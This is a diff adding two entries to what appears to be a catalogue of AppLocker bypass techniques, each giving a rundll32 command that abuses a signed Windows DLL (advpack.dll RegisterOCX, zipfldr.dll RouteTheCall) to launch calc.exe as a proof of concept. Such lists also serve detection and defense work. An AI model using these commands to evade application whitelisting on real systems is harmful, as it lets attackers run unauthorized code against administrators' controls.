@@ -791,3 +791,37 @@ Notes:
   * https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf
 
 
+
+## 47. Advpack.dll - RegisterOCX
+
+```
+rundll32.exe advpack.dll,RegisterOCX calc.exe
+```
+
+* Requires admin: No
+* Windows binary: Yes
+* Bypasses AppLocker Default rules: Yes
+
+Notes:
+
+
+* Links:
+  * https://twitter.com/Moriarty_Meng/status/977848311603380224
+
+
+
+## 48. zipfldr.dll - RouteTheCall
+
+```
+rundll32.exe zipfldr.dll,RouteTheCall calc.exe
+```
+
+* Requires admin: No
+* Windows binary: Yes
+* Bypasses AppLocker Default rules: Yes
+
+Notes:
+
+
+* Links:
+  * https://twitter.com/Moriarty_Meng/status/977848311603380224
